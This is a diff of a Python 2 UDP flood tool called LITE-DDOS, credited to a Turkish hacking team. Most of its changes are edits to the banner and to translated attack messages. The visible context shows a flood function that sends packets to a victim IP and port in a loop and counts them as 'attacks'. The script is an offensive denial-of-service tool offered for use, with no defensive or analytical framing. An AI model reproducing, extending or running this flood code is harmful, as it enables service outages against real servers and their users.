@@ -6,14 +6,14 @@ def usage():
     print "\033[1;32m#########################################################"
     print "#------------------------[\033[1;91mLITE-DDOS\033[1;32m]---------------------#"
     print "#-------------------------------------------------------#"
-    print "#   \033[1;91mKomut: " "python2 LITEDDOS.py " "<ip> <port> <paket> \033[1;32m   #"
+    print "#   \033[1;91mCommand: " "python2 LITEDDOS.py " "<ip> <port> <packet> \033[1;32m   #"
     print "#                                                       #"
-    print "#\033[1;91mCreator:LordKAYA \033[1;32m##      ###       ##                #"
-    print "#\033[1;91mTeam   : THT        \033[1;32m##     #          ##                #"
+    print "#\033[1;91mCreator:LordMami \033[1;32m##      ###       ##                #"
+    print "#\033[1;91mTeam   : THT   \033[1;32m##     #          ##                #"
     print "#\033[1;91mVersion:1.0 BETA       \033[1;32m##      ###       ##                #"
     print "#                   ## \033[1;91m ##     \033[1;32m#  \033[1;91m##  \033[1;32m##                #"
     print "#                   ##  \033[1;91m##  \033[1;32m###   \033[1;91m##  \033[1;32m######            #"
-    print "#               \033[1;91m<--[TürkHackTeamLordMami]-->         \033[1;32m#"
+    print "#               \033[1;91m<--[TürkHackTeamLord]-->         \033[1;32m#"
     print "#########################################################"
     print "                        @@@@@@@@@@"
     print "                       @@@@@@@@@@@@"
@@ -34,7 +34,7 @@ def flood(victim, vport, duration):
             pass
         client.sendto(bytes, (victim, vport))
         sent = sent + 1
-        print "\033[1;91mSALDIRI \033[1;32m%s \033[1;91mATILAN PING \033[1;32m%s \033[1;91m PORT \033[1;32m%s "%(sent, victim, vport)
+        print "\033[1;91mSaldiri \033[1;32m%s \033[1;91mAtılan Ping \033[1;32m%s \033[1;91mPORT \033[1;32m%s "%(sent, victim, vport)
 def main():
     print len(sys.argv)
     if len(sys.argv) != 4:
